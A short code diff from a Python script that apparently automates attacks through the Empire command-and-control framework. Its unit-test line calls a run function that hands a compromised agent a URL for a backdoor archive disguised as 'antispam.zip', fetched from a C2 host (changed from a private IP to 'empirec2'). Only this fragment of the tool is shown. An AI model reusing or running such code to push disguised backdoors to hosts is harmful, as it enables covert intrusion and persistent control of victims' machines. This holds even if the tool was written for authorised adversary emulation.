@@ -87,4 +87,4 @@ def run(API, agent_name, vsto_zip_backdoor_url):
 
 if __name__ == '__main__': # unit test
     API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
-    print(run(API, API.agents()['agents'][0]['name'], 'http://192.168.181.1:8000/antispam.zip'))
+    print(run(API, API.agents()['agents'][0]['name'], 'http://empirec2:8000/antispam.zip'))
